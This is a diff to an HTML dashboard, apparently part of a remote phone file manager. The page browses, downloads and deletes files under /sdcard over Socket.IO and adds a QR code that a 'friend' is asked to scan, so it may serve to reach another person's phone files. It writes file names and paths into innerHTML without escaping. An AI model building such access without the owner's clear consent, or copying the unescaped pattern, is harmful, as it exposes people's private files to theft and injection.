@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phone Data Manager</title>
+    <title>Live Remote Phone Manager</title>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <style>
         body { font-family: sans-serif; background: #111827; color: white; margin: 0; padding: 15px; }
@@ -17,12 +17,22 @@
         .folder { color: #38bdf8; cursor: pointer; font-weight: bold; }
         .btn-del { background: #dc2626; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }
         .btn-down { background: #2563eb; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; margin-right: 5px; }
+        .qr-box { text-align: center; margin-top: 20px; background: #111827; padding: 15px; border-radius: 8px; border: 1px dashed #374151; }
+        .qr-box img { width: 160px; height: 160px; border-radius: 6px; background: white; padding: 5px; }
     </style>
 </head>
 <body>
     <div class="box">
         <h2>📱 Live Remote Phone Manager</h2>
         <p>Status: <span id="status" class="status off">Waiting for Phone...</span></p>
+        
+        <!-- Friend ke scan karne ke liye QR Code Box -->
+        <div class="qr-box">
+            <p><b>Friend Scanner:</b> अपने फ्रेंड से कहें कि वह इस QR Code को स्कैन करे:</p>
+            <img id="qr-img" src="" alt="Loading QR Code...">
+            <p><a id="site-url" href="#" target="_blank" style="color: #38bdf8; word-break: break-all;"></a></p>
+        </div>
+
         <div class="path">Location: <b id="current-path">/sdcard</b></div>
 
         <table>
@@ -42,6 +52,16 @@
     <script>
         const socket = io();
         let currentPath = '/sdcard';
+
+        // QR Code load karein
+        fetch('/get_qr')
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('qr-img').src = 'data:image/png;base64,' + data.qr_code;
+                const link = document.getElementById('site-url');
+                link.href = data.url;
+                link.innerText = data.url;
+            });
 
         socket.on('status_update', (data) => {
             const statusEl = document.getElementById('status');
@@ -78,6 +98,7 @@
                 const tr = document.createElement('tr');
                 const cleanPath = file.path.replace(/\\/g, '/');
                 if (file.is_dir) {
+                    tr.html = '';
                     tr.innerHTML = `
                         <td class="folder" onclick="openFolder('${cleanPath}')">📁 ${file.name}</td>
                         <td>Folder</td>
@@ -111,4 +132,5 @@
         function downloadFile(path) { socket.emit('download_file', { path: path }); }
     </script>
 </body>
-</html>
+                   </html>
+                   
